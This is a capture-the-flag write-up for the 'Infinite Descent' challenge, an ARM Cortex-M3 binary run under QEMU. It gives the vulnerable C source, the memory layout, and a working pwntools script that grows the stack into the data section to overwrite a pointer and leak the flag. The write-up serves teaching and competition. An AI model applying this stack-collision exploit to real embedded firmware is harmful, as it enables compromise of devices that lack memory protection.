# Infinite Descent (Binary Exploitation)
> At the end lies your flag.

The challenge implements an embedded ARM program that is ran using QEMU. QEMU is configured to use the TI lm3s6965evb Cortex M3 microcontroller machine.

## Challenge
The challenge itself makes use of semihosting, a technique where a binary being emulated on a host can make requests to the host, such as requesting I/O. The challenge uses semihosting because it's quite simple and easier to implement for me and understand for solvers than setting up UART. The READ and WRITE functions are implemented with this.

The challenge is cross-compiled with GCC with a given linker script corresponding to the device and the ARM CMSIS library.

The challenge itself is as follows:
```c
char volatile* end_of_the_tunnel = "irisctf{REDACTED_REDACTED_REDA}";
char readbuf[5] = {0};
char* last_message = "(You didn't write anything)";

void descend() {
    WRITE("How many characters do you write in the ground (up to 4096)? Send exactly 4 digits and the newline.\n");
    READ(readbuf, 4 + 1);
    readbuf[4] = 0;
    long int n = strtol(readbuf, NULL, 10);
    if(n <= 0 || n > 4096) { return; }
    {
        WRITE("Send n characters and the newline.\n");
        char input[n+1];
        last_message = input;
        READ(input, (size_t)n+1);
        descend();
    }
}

int main() {
    WRITE("Welcome to my tunnel.\n");
    descend();
    WRITE("You run out of energy and pass away.\n");
    WRITE("Your final message is: ");
    WRITE(last_message);
    WRITE("\nGoodbye.\n");

    return 0;
}
```

The `main()` function prints a welcome message and calls the `descend()` function. Once it's done, it prints out the message at the `last_message` pointer, and exits.

The `descend()` function recurively takes input and puts it on the stack. It reads up to 4096 bytes at a time into a buffer which is allocated with a given size, updates the `last_message`, then calls `descend()` again.
If the given amount of input is too big or <= 0, then program returns all the way back to main.

## Solution
Notice the sections in RAM are laid out interestingly:
```
20000000 l    d  .data  00000000 .data
20000074 l    d  .bss   00000000 .bss
20000138 l    d  .heap  00000000 .heap
2000c000 l    d  .stack 00000000 .stack
```

The stack is located directly after the data, bss, and heap sections without any unmapped memory. There is no ASLR, and there's actually no code preventing the stack from running on top of other sections! This means that we can keep adding data to the stack and eventually _overflow_ on the `last_message` pointer. The flag is in a known position on ROM, so we can print it out by setting the `last_message` to its position.

Attaching a debugger to QEMU and searching memory we can find the flag is located at 0x2470, and testing input shows after 15 blocks of 4096 bytes our next block can overflow the stack section. For the final input, we choose a input number of bytes such that our pointer will be overlaid on `last_message` and is the start of the message (since the stack buffer for our input starts on top of `last_message`). Again, using a debugger is the easiest for this - send a sequence and see which address it hard faults on (or break on write to `last_message`). If the final input size is too big, the stack will fall out of RAM and cause an hard fault on write.

```py
r = # remote or process

for _ in range(15):
    r.recvuntil(b"newline.\n")
    r.sendline(b"4096")
    r.recvuntil(b"newline.")
    r.sendline(b"a" * 4096)

r.recvuntil(b".\n")
r.sendline(b"3072")
r.sendline(b"@'\x00\x00" + b"a"*3068)
r.sendline(b"0000\n")
r.interactive()

```

```
irisctf{no_protection_for_stak}
```

I should have made a sequel challenge where you buffer overflow onto a vector table and then use semihosting calls to break out of the emulator..
